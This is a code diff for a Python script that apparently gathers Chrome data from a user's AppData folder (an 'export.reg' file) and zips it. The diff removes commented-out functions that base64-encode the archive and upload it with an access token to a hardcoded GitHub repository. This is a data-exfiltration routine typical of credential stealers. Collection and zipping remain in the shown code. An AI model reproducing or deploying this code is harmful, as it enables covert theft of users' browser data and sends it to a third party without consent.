@@ -1,8 +1,5 @@
 from os import system, path, environ, walk
 from zipfile import ZipFile, ZIP_DEFLATED
-from base64 import b64encode
-import json
-import requests
 Path = "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\export.reg"
 
 # ------------------- get data -----------------
@@ -32,38 +29,8 @@ def createzip():
 
 
 
-# # ------------------- zip data -----------------
-#
-# # ------------------- convert 2 64 data -----------------
-# def Convert2Base64():
-#     with open(f"{environ['USERPROFILE']}" + fr"/AppData/reg.zip", 'rb') as F:
-#         BaseCvt = b64encode(F.read())
-#     return BaseCvt
-# # ------------------- convert 2 64 data -----------------
-#
-# # ------------------- def send data -----------------
-# def sendGit(TOKEN, content, name_file_in_site):
-#     sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_in_site}",
-#                        headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
-#     content_bytes = content.decode('utf-8')
-#     print(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_in_site}")
-#     data = {"content": content_bytes, "message": "data", "sha": sha}
-#     data = json.dumps(data)
-#     main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_in_site}", data=data,
-#                         headers={"Authorization": f"token {TOKEN}"})
-#     if main.status_code == 200:
-#         return True
-#     else:
-#         return False
-# ------------------- def send data -----------------
-
-
-
 
 getData()
 zipData = createzip()
 print(zipData)
-#
-# if zipData == True:
-#     Content = Convert2Base64()
-#     sendGit()
+
